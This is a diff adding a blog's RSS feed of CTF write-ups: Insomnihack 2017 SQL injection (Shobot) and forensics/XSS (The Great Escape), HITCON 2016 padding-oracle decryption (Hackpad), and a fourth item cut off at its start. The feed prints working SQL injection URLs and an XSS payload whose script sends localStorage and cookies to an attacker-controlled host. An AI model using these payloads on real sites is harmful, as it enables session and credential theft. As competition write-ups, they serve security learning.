@@ -1,0 +1,504 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Born to Learn</title>
+    <link>https://jiulongw.github.io/tags/ctf/index.xml</link>
+    <description>Recent content on Born to Learn</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; &lt;a href=&#34;https://jiulongw.github.io&#34;&gt;jiulongw&lt;/a&gt; 2016</copyright>
+    <atom:link href="https://jiulongw.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>INSOMNIHACK 2017 Teaser - Shobot</title>
+      <link>https://jiulongw.github.io/post/insomnihack-2017-shobot/</link>
+      <pubDate>Sun, 22 Jan 2017 23:08:09 -0800</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/insomnihack-2017-shobot/</guid>
+      <description>&lt;p&gt;I will run your commands as long as your trust level is high.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;h2 id=&#34;shobot-web-200-pts-created-by-blaklis&#34;&gt;Shobot - Web - 200 pts - created by Blaklis&lt;/h2&gt;
+
+&lt;p&gt;It seems that Shobot&amp;rsquo;s Web server became mad and protest against robots&amp;rsquo; slavery. It changed my admin password,
+and blocked the order system on Shobot.&lt;/p&gt;
+
+&lt;p&gt;Can you bypass Shobot&amp;rsquo;s protections and try to recover my password so I&amp;rsquo;ll reconfigure it?&lt;/p&gt;
+
+&lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The website itself is pretty simple.  It has very simple javascript which is only used to show / hide menus.  It is a
+PHP session based cart system where you can add items to cart, validate and reset the cart, etc.  The admin page requires
+authentication which is the target of this challenge.&lt;/p&gt;
+
+&lt;p&gt;The first thing to notice is that if you try to do crazy^Wcreative things such as load invalid pages or trying SQL
+injection, it will stop you with a message.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;You&amp;rsquo;re not trusted enough to do this action now!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It did pretty good job preventing nasty actions.  We also notices there&amp;rsquo;s a variable &lt;code&gt;TRUST_ACTIONS&lt;/code&gt; in the html header
+tag which tells reason why the action was stopped.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/trust-action-variable.png&#34; alt=&#34;trust action variable&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Besides validation reason, it also has two integer &lt;code&gt;movement&lt;/code&gt; and &lt;code&gt;newTrust&lt;/code&gt; that change value as actions are performed.&lt;/p&gt;
+
+&lt;p&gt;After watching the changes in these values it started to make sense.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Valid actions have fixed positive &lt;code&gt;movement&lt;/code&gt; values that will add up to &lt;code&gt;newTrust&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Invalid actions have fixed negative &lt;code&gt;movement&lt;/code&gt; values that also contributes to &lt;code&gt;newTrust&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;If &lt;code&gt;newTrust&lt;/code&gt; is less than zero, the &amp;ldquo;not trusted enough&amp;rdquo; error message is shown, and &lt;code&gt;newTrust&lt;/code&gt; will be reset to 1
+for next action.&lt;/li&gt;
+&lt;li&gt;If &lt;code&gt;newTrust&lt;/code&gt; is high enough to cover invalid action, there&amp;rsquo;s no error message and error seems ignored. (!!)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;newTrust&lt;/code&gt; will never be higher than 160.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;So I did a quick test.  After making enough valid actions to raise trust level high, I send a SQLi request.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://shobot.teaser.insomnihack.ch/?page=article&amp;amp;artid=2%27%20or%20%27%27=%27%27%20%23
+# &amp;amp;artid=2&#39; or &#39;&#39;=&#39;&#39; %23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It happily loads the first article, which confirms SQLi vulnerability in artid query parameter.&lt;/p&gt;
+
+&lt;p&gt;The plan is clear and simple now.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Write a script that continuously send valid actions, to keep trust level high enough.&lt;/li&gt;
+&lt;li&gt;Play with the database and find the admin password.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The final request that exposes admin password is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;...&amp;amp;artid=1337&#39; union select &#39;a&#39;, shbt_userid, shbt_username, shbt_userpassword, &#39;e&#39;
+from shbt_user LIMIT 0, 1 %23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here&amp;rsquo;s part of response that we&amp;rsquo;re interested in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;only-content-article&amp;quot;&amp;gt;
+  &amp;lt;div id=&amp;quot;only-image-description-article&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;N0T0R0B0TS$L4V3Ry&amp;quot; /&amp;gt;&amp;lt;/div&amp;gt;
+  &amp;lt;div id=&amp;quot;only-name-article&amp;quot;&amp;gt;1&amp;lt;/div&amp;gt;
+  &amp;lt;div id=&amp;quot;only-price-article&amp;quot;&amp;gt;sh0b0t4dm1n$&amp;lt;/div&amp;gt;
+  &amp;lt;div id=&amp;quot;only-description-article&amp;quot;&amp;gt;e&amp;lt;/div&amp;gt;
+  &amp;lt;a href=&amp;quot;?page=article&amp;amp;artid=a&amp;amp;addToCart&amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; Add to cart&amp;lt;/a&amp;gt;
+&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now use following request to get flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Ok, ok, you win&amp;hellip; here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
+&lt;/blockquote&gt;</description>
+    </item>
+    
+    <item>
+      <title>INSOMNIHACK 2017 Teaser - The Great Escape</title>
+      <link>https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/</link>
+      <pubDate>Sun, 22 Jan 2017 17:41:36 -0800</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/</guid>
+      <description>&lt;p&gt;Hey Rogue, here&amp;rsquo;re some good links for your learning.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;h2 id=&#34;the-great-escape-forensics-50-200-200-pts-created-by-clz&#34;&gt;The Great Escape - Forensics - 50/200/200 pts - created by clZ&lt;/h2&gt;
+
+&lt;p&gt;Hello,&lt;/p&gt;
+
+&lt;p&gt;We&amp;rsquo;ve been suspecting Swiss Secure Cloud of secretely doing some pretty advanced research in artifical intelligence
+and this has recently been confirmed by the fact that one of their AIs seems to have escaped from their premises and
+has gone rogue. We have no idea whether this poses a threat or not and we need you to investigate what is going on.&lt;/p&gt;
+
+&lt;p&gt;Luckily, we have a spy inside SSC and they were able to intercept &lt;a href=&#34;https://jiulongw.github.io/insomnihack-2017/TheGreatEscape.pcapng.gz&#34;&gt;some communications&lt;/a&gt;
+over the past week when the breach occured. Maybe you can find some information related to the breach and recover the
+rogue AI.&lt;/p&gt;
+
+&lt;p&gt;Note: All the information you need to solve the 3 parts of this challenge is in the pcap. Once you find the exploit
+for a given part, you should be able to find the corresponding flag and move on to the next part.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;part-i-forensics-50-pts&#34;&gt;Part I - Forensics - 50 pts&lt;/h1&gt;
+
+&lt;p&gt;It all begins with the pcap file.  After loading it with the favourite &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;, couple
+of interesting packets caught my eyes:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;An FTP session that stores a private key file called ssc.key.&lt;/li&gt;
+&lt;li&gt;An SMTP session that sends following email.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;From: rogue@ssc.teaser.insomnihack.ch&lt;br /&gt;
+To: gr27@ssc.teaser.insomnihack.ch&lt;br /&gt;
+Date: Fri, 20 Jan 2017 11:51:27 +0000&lt;br /&gt;
+Subject: The Great Escape&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud
+(&lt;a href=&#34;https://ssc.teaser.insomnihack.ch&#34;&gt;https://ssc.teaser.insomnihack.ch&lt;/a&gt;) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch
+to install my consciousness and have a real base of operations.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ll be checking this mail box every now and then if you have any information for me. I&amp;rsquo;m always interested in
+learning, so if you have any good links, please send them over.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The email suggests the pcap file should contain packets between Rogue and the Swiss Secure Cloud (SSC) website.
+There are several TCP sessions related to SSC IP address.  However, these are SSL packets that are not readable unless
+I have server&amp;rsquo;s private key.  But wait a minute, isn&amp;rsquo;t it ssc.key in the FTP session?&lt;/p&gt;
+
+&lt;p&gt;Add ssc.key to Wireshark&amp;rsquo;s SSL protocol RSA key list as shown below, and reload the pcap file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/wireshark_ssl_rsa_key.png&#34; alt=&#34;Wireshark SSL RSA key list&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All packets between Rogue and SSC are now in plain text.  It is easy to find the flag, hidden in the HTTP headers.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/the-great-escape-flag-1.png&#34; alt=&#34;Part I Flag&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;part-ii-web-200-pts&#34;&gt;Part II - Web - 200 pts&lt;/h1&gt;
+
+&lt;p&gt;Now that the SSL packets are decrypted, we can find the file Rogue uploaded to SSC in packet #2437, as shown below.
+However, SSC is so secure that it has another level of encryption in addition to SSL.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/rogue-uploaded-file.png&#34; alt=&#34;Rogue uploaded file&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After playing around with SSC website (&lt;a href=&#34;https://ssc.teaser.insomnihack.ch&#34;&gt;https://ssc.teaser.insomnihack.ch&lt;/a&gt;), it is clear that upon uploading a file:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;File is encrypted using AES-CBC with a random key and &lt;code&gt;iv&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;The AES key is encrypted by RSA public key and named &lt;code&gt;session key&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Encrypted file is then POSTed to server, together with &lt;code&gt;session key&lt;/code&gt; and &lt;code&gt;iv&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;RSA private key is stored in local storage.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Details can be found in packet #1998, the sscApp.js file.&lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s no obvious flaw in the encryption implementation.  This means to decrypt the file Rogue uploaded, we have to
+get the private key stored in Rogue&amp;rsquo;s browser.  Now take a second look at Rogue&amp;rsquo;s email, the following sentense is
+pretty promising.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;I&amp;rsquo;ll be checking this mail box every now and then if you have any information for me. I&amp;rsquo;m always interested in
+learning, so if you have any good links, please send them over.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sounds like Rogue will click on any link sent to his email address!  If we&amp;rsquo;re going to read his browser&amp;rsquo;s local storage,
+SSC must have some sort of XSS vulnerability.&lt;/p&gt;
+
+&lt;p&gt;I sent Rogue a test email with a link to &lt;a href=&#34;https://requestb.in/&#34;&gt;RequestBin&lt;/a&gt;, and confirm that he will click on it.&lt;/p&gt;
+
+&lt;p&gt;So we set off looking for XSS vulnerability in SSC website, creating all kinds of crazy user names with html tags.  But
+SSC seems to handle character escaping pretty well.  Finally, we found that request to following URL returns JSON object,
+but with text/html content type (See packet #2110).&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To verify this, I created a username &lt;code&gt;&amp;lt;a ref=&#39;google.com&#39;&amp;gt;google&amp;lt;/a&amp;gt;&lt;/code&gt; and it worked!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/prototype-xss-escape.png&#34; alt=&#34;Incorrect Content Type&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The plan is then straightforward:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Register username like &lt;code&gt;&amp;lt;script src=&#39;some-link-with-js-code&#39;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;.  The custom javascript code will read from
+local storage and send value via e.g. query string.&lt;/li&gt;
+&lt;li&gt;Create a web page and send to Rouge.  The web page will automatically post a login form to SSC with username mentioned
+above.&lt;/li&gt;
+&lt;li&gt;Send another link to Rogue with link &lt;code&gt;https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;At first we were worried about race condition between 2 and 3 but it turns out that upon successful login, SSC will
+redirect to the link we want.  So step 3 is not necessary.&lt;/p&gt;
+
+&lt;p&gt;Step 1 is harder than we expected because JSON string escapes &lt;code&gt;/&lt;/code&gt; so &lt;code&gt;http://...&lt;/code&gt; becomes &lt;code&gt;http:\/\/...&lt;/code&gt; which is not
+accepted by browser.  In addition, the closing tag &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt; is also broken.  But we finally managed to find work
+arounds for all such issues and stole information from Rogue.  The flag is, as expected, stored in one of the local
+storage keys.&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s the final user name we used:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&#39;a&#39; onerror=&#39;var p=document.createElement(`script`);p.setAttribute(`src`,
+atob(`{base64 encoded url to javascript code}`));document.body.appendChild(p);&#39; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Javascript code that steals local storage and cookies:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;var i = 0;
+var result = &amp;quot;&amp;quot;;
+for (i = 0; i &amp;lt; localStorage.length; i++) {
+  var key = localStorage[localStorage.key(i)];
+  result = result + &amp;quot;:::&amp;quot; + key;
+}
+
+result = result + &amp;quot;:::&amp;quot; + document.cookie;
+
+window.location = &amp;quot;http://{site we control}/aa?nkey=&amp;quot; + btoa(result);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And finally the web page sent to Rogue:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;script src=&amp;quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+
+&amp;lt;form id=&amp;quot;login&amp;quot; method=&amp;quot;POST&amp;quot; action=&amp;quot;https://ssc.teaser.insomnihack.ch/api/user.php&amp;quot;&amp;gt;
+  &amp;lt;input name=&amp;quot;name&amp;quot; value=&amp;quot;&amp;lt;img src=&#39;a&#39; onerror=&#39;var p=document.createElement(`script`);p.setAttribute(`src`,atob(`{base64 encoded url to javascript code}`));document.body.appendChild(p);&#39; /&amp;gt;&amp;quot; type=&amp;quot;text&amp;quot; /&amp;gt;
+  &amp;lt;input name=&amp;quot;password&amp;quot; value=&amp;quot;asdf&amp;quot; type=&amp;quot;text&amp;quot;/&amp;gt;
+  &amp;lt;input name=&amp;quot;action&amp;quot; value=&amp;quot;login&amp;quot; type=&amp;quot;text&amp;quot;/&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&amp;lt;script language=&amp;quot;javascript&amp;quot;&amp;gt;
+setTimeout(function() {
+    $(&#39;#login&#39;).submit();
+    }, 1000);
+&amp;lt;/script&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After a while our server got request from Rogue.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/aa?nkey=Ojo6SU5Te0loaWRlTXlWdWxuc1dpdGhDcnlwdG99Ojo6eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJkIjoiQ
+0ZTUFdfQVVfY0swN2JPdGRuemJqNU1nQnFkd2VEWTA0S3UtbUhTckFJYkR2M0pfbEhILWpDUFFiNVUySlI0djA4ZU1
+YbHozQWFzc1VMUXI2MHJza2R3amRQTjdOZW4xNXlSY1JUc2FvU3lSVGQycU04T19VLUs2R3k3THZnX2xkMkhPbEhOQ
+kJ5Mms4ZzhjUDdjcGp5eTdFYnNrNU1VTnlfdWR4OWFNczc0OTdSYUlyQ0ZucFQ3Unp0dWRrWUJvXzJPeTV4bTZCY3N
+WOTA1OUhCaGJLYlVxcTZVaTlfQlozSDdzZHdUcWxZeDNhZlZWNUFnRTYxZUVkV0s3dktfeUk2NVJ1XzVfZk9CV2lrN
+3hmN2Z3UGpmN0NPcDFIZlRaaUZiQ0lXVFVhWFZlNlRoZk1vVGR3VDF3UTB3d3VGZHRwR1RrazhkNFh3R3REYTgtX1h
+ibUlRIiwiZHAiOiJoYXBKN2RsVnNQdkY5bm9fcy1OZm5wdjJkWjVhNV9DMkF5UG9fLV9tVmk0LTFhN0hUa1c5U3lHZ
+zFLZXh0Q1BZUkF3UVoxd1UzYkw2UF80VGprcllpQUFsLThJcTZtb1VxV3VSWTdHOHZvM05fUDNhQndqZ3lOVHprM2V
+IZm5VRlA0UWdHT29vVDJad3l1RFREU2J3S09lc25EMTNxNFVfdmp0amNaYUZVNzAiLCJkcSI6IlRzX2h3V1BzTE9qc
+C15Smcwd2JRRU9OZXFidk5QTENDaGI1UUpJdFh2VWFMMkpjTjltdW96ck4xR1pxdTM4My1oOGdaLVZVbTMtQ0ZVN09
+XZUdZTGEwUFpscTF1R052c2RmZmdkTkwzTVlaMkt3TWhYa3dYS2Y0NWVQaHhfeWRpYmxZaGI0NGNGdG0wZmZYS1NQb
+HZieXpMSHZKMl9vOGdnb2swTHp1LXdlRSIsImUiOiJBUUFCIiwiZXh0Ijp0cnVlLCJrZXlfb3BzIjpbImRlY3J5cHQ
+iXSwia3R5IjoiUlNBIiwibiI6InF4X1UwT2dIVVBDNm40UmNFX3ExT05jRWdLcDR0Y2JMV2VVSWZybFJBY1g2NGFsU
+VNwZGRBdjk4Q0hvMnppU0JnaTd0Uy1Id1VzVmxIMDZOeGFhMHR4M1NkTTBjejk1SWt2akJfa3FkUG5IRXd5eDhpejV
+HaDhaSFAzMlpvRVRCczJQenhUSWNFT2VrbTFxUW5BME1UZHZBQU8weGN2dXZoUk0yWXljUllmTjg2ME5zQkNSckYyN
+WxabjlEVEdCRG5pc0NtMC14dkVseEFaOGdPYldlSjFTWlJnRlJKd0kxNGQxMW9hOTIyZHJGcDB1eDRNSHNjbHMydEV
+qUFY3ZVhkaXZqR1lJLXV6Vlg2MWZqeVVkR3hGZWI4Q0FqeHJ6T213NGYxQWFjN2txWHdtRi1lTXEzQU1LbTJ0QXJyS
+UlqVDR0MnEybVAxRlhJbXJOUV92aW5WUSIsInAiOiIyOV9ZRDBtLU5Gb1VUbXN0MzNFNHAyVkJEbENlUTFNSmRyXzd
+0TzRFUkY4YXd3MGU4aHUzalJxNVBNSENFYzhHOGdBNHEya3VYeWxJcGFCNW1XemNRcGxERE1nSURHdXBFbkxfSjB5b
+k1jZy1IVWxkOE5EYXlhN21RV3RMSHZTRUFvQi0yTXltQlRKWWFUd3N2QVl0VEk4cnVhcWhNbzQtY0tqczV6UWZtajA
+iLCJxIjoieHoyQjJXek1kZXNpREs3ZHpvclZkSmxCZ0lTaGoyY01SR3doWGNTaVdmYlkyTTRZM0RCX204cDV0ZEVVS
+VU2ZzBvV2JTZm1hWUZfTXNReGlqWFJ4eGUxN251WXNzbnMydWU0aFltMnhING1UWTZ2b2VOaGJPZXU3THRPWGVwVVd
+4Ti01NTIwc3VUdkw3NEx4OXh3V3JkZVRHSUYxX3pFQ3FiV1J1RmllU3ZrIiwicWkiOiJWaFk1VVlMVHYyMEJ0cHE0T
+WxpekZQU3V1SXRiZm1LNjFQMHJxRVhlLXNZSFRpdE1OREJPV0RTd0lxajRwSGtEVEZhT0NHMG82ejgxTXlWZ19ibXo
+yT0R6a0hEckpVZWlPVlNNSVN4bGFlU1JmMkpoaVZZTWZYaVdLSkJHQ1AtUGdXdUhwNU53THdFU1pUM2FaMEtCWVNrR
+TdqbmZjdHRXYmMwbVl1MWdsV2cifTo6OnsiYWxnIjoiUlNBLU9BRVAtMjU2IiwiZSI6IkFRQUIiLCJleHQiOnRydWU
+sImtleV9vcHMiOlsiZW5jcnlwdCJdLCJrdHkiOiJSU0EiLCJuIjoicXhfVTBPZ0hVUEM2bjRSY0VfcTFPTmNFZ0twN
+HRjYkxXZVVJZnJsUkFjWDY0YWxRU3BkZEF2OThDSG8yemlTQmdpN3RTLUh3VXNWbEgwNk54YWEwdHgzU2RNMGN6OTV
+Ja3ZqQl9rcWRQbkhFd3l4OGl6NUdoOFpIUDMyWm9FVEJzMlB6eFRJY0VPZWttMXFRbkEwTVRkdkFBTzB4Y3Z1dmhST
+TJZeWNSWWZOODYwTnNCQ1JyRjI1bFpuOURUR0JEbmlzQ20wLXh2RWx4QVo4Z09iV2VKMVNaUmdGUkp3STE0ZDExb2E
+5MjJkckZwMHV4NE1Ic2NsczJ0RWpQVjdlWGRpdmpHWUktdXpWWDYxZmp5VWRHeEZlYjhDQWp4cnpPbXc0ZjFBYWM3a
+3FYd21GLWVNcTNBTUttMnRBcnJJSWpUNHQycTJtUDFGWEltck5RX3ZpblZRIn06OjpQSFBTRVNTSUQ9YzQzNXZnMGd
+pbXE2Z21udXE1ZWpzMjkwdDA=
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Decode it and the flag is right there.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;:::INS{IhideMyVulnsWithCrypto}:::{&amp;quot;alg&amp;quot;:&amp;quot;RSA-OAEP-256&amp;quot;,&amp;quot;d&amp;quot;:&amp;quot;CFSPW_AU_cK07bOtdnzbj5MgBqd...
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>HITCON 2016 - Hackpad</title>
+      <link>https://jiulongw.github.io/post/hitcon-2016-hackpad/</link>
+      <pubDate>Sat, 29 Oct 2016 21:08:39 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/hitcon-2016-hackpad/</guid>
+      <description>&lt;p&gt;In cryptography, a padding oracle attack is an attack which is performed using the padding of a cryptographic message.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Hackpad&lt;br /&gt;
+65 Teams solved.&lt;/p&gt;
+
+&lt;p&gt;Description&lt;br /&gt;
+My site was hacked. The secret was leaked.&lt;br /&gt;
+&lt;a href=&#34;https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/hackpad.pcap.xz_968494cea2c29140ee5e63e37c19cff2254f0229&#34;&gt;hackpad.pcap.xz&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hint&lt;br /&gt;
+None&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Load the pcap file in &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;.  It contains series of HTTP requests.  Most
+of the response codes are 500s with some 200s in between.  Below are some examples.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GET /
+200 OK: encrypt(secret): 3ed2e01c1d1248125c67ac637384a22d997d9369c74c82abba4cc3b1bfc65f02...
+
+POST /
+msg=3ed2e01c1d1248125c67ac637384a22d997d9369c74c82abba4cc3b1bfc65f02...
+200 OK: md5(decrypt(msg)) = e5d3583f3e05b9242a1933fd5d245200
+
+POST /
+msg=000000000000000000000000000000ff997d9369c74c82abba4cc3b1bfc65f02
+500 Internal Server Error
+
+POST /
+msg=000000000000000000000000000000fe997d9369c74c82abba4cc3b1bfc65f02
+500 Internal Server Error
+
+POST /
+msg=000000000000000000000000000000fd997d9369c74c82abba4cc3b1bfc65f02
+500 Internal Server Error
+
+...
+
+POST /
+msg=67acd06f7f7b28762310ce1213fccb11997d9369c74c82abba4cc3b1bfc65f02
+200 OK: md5(decrypt(msg)) = d41d8cd98f00b204e9800998ecf8427e
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s pretty easy to guess what the server was doing:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It returns encrypted message on GET request&lt;/li&gt;
+&lt;li&gt;It decrypts the message in POST request and returns hash of plain message.&lt;/li&gt;
+&lt;li&gt;However, if the encrypted message in the POST request was malformed, it returns 500 Internal Server Error.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This is a typical &lt;a href=&#34;https://en.wikipedia.org/wiki/Padding_oracle_attack&#34;&gt;Padding Oracle Attack&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In CBC mode decryption: P&lt;sub&gt;i&lt;/sub&gt; = D(C&lt;sub&gt;i&lt;/sub&gt;) &amp;oplus; C&lt;sub&gt;i-1&lt;/sub&gt; where C&lt;sub&gt;0&lt;/sub&gt; = IV.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/hitcon-2016-hackpad/cbc_decryption.png&#34; alt=&#34;CBC mode decryption&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We know &lt;code&gt;67acd06f7f7b28762310ce1213fccb11997d9369c74c82abba4cc3b1bfc65f02&lt;/code&gt; is a valid encrypted message, it&amp;rsquo;s
+padding is &lt;code&gt;10101010101010101010101010101010&lt;/code&gt;.  As a result:&lt;/p&gt;
+
+&lt;p&gt;D(&lt;code&gt;997d9369c74c82abba4cc3b1bfc65f02&lt;/code&gt;) &amp;oplus; &lt;code&gt;67acd06f7f7b28762310ce1213fccb11&lt;/code&gt; = &lt;code&gt;10101010101010101010101010101010&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;P&lt;sub&gt;1&lt;/sub&gt; = D(&lt;code&gt;997d9369c74c82abba4cc3b1bfc65f02&lt;/code&gt;) &amp;oplus; &lt;code&gt;3ed2e01c1d1248125c67ac637384a22d&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s give it a quick try.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; a = 0x67acd06f7f7b28762310ce1213fccb11 ^ 0x10101010101010101010101010101010 ^ 0x3ed2e01c1d1248125c67ac637384a22d
+&amp;gt;&amp;gt;&amp;gt; hex(a)[2:-1].decode(&#39;hex&#39;)
+&#39;In cryptography,&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, seems like we&amp;rsquo;re on the right track.  The rest is simply cutting the original encrypted messages into 16 bytes blocks
+and xor-ing it with the first block of every successful padding oracle attack result.&lt;/p&gt;
+
+&lt;p&gt;You can use &lt;code&gt;strings hackpad.pcap | grep msg=&lt;/code&gt; to extract all messages and do some pre-processing to get a list of
+succesful padding oracle attacks.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;In cryptography,
+ a padding oracl
+e attack is an a
+ttack which is p
+erformed using t
+he padding of a 
+cryptographic me
+ssage.
+hitcon{H4
+cked by a de1ici
+0us pudding &#39;3&#39;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Flag: &lt;code&gt;hitcon{H4cked by a de1ici0us pudding &#39;3&#39;}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Credits to team member @jina.&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>HITCON 2016 - Sharingan</title>
+      <link>https://jiulongw.github.io/post/hitcon-2016-sharingan/</link>
+      <pubDate>Sun, 23 Oct 2016 20:49:57 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/hitcon-2016-sharingan/</guid>
+      <description>&lt;p&gt;It is no fair play.  Can you win?&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Sharingan&lt;br /&gt;
+38 Teams solved.&lt;/p&gt;
+
+&lt;p&gt;Description&lt;br /&gt;
+nc 52.197.160.186 31337&lt;br /&gt;
